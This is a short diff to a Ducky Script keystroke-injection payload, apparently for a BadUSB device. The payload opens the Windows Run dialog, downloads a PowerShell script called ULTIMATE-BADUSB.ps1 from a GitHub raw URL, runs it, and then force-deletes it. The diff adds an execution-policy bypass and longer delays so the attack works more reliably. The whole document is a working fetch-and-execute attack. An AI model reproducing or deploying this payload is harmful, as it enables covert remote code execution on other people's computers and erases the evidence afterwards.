@@ -3,12 +3,12 @@ GUI r
 DELAY 1000
 STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KoosVanDerMerwe/ULT-BADUSB/main/ULTIMATE-BADUSB.ps1' -OutFile 'C:\Users\Public\ULTIMATE-BADUSB.ps1'"
 ENTER
-DELAY 1000
+DELAY 10000
 GUI r
 DELAY 1000
-STRING powershell -File "C:\Users\Public\ULTIMATE-BADUSB.ps1"
+STRING powershell -ExecutionPolicy Bypass -File "C:\Users\Public\ULTIMATE-BADUSB.ps1"
 ENTER
-DELAY 5000
+DELAY 10000
 GUI r
 DELAY 1000
 STRING powershell -Command "Remove-Item -Path 'C:\Users\Public\ULTIMATE-BADUSB.ps1' -Force"
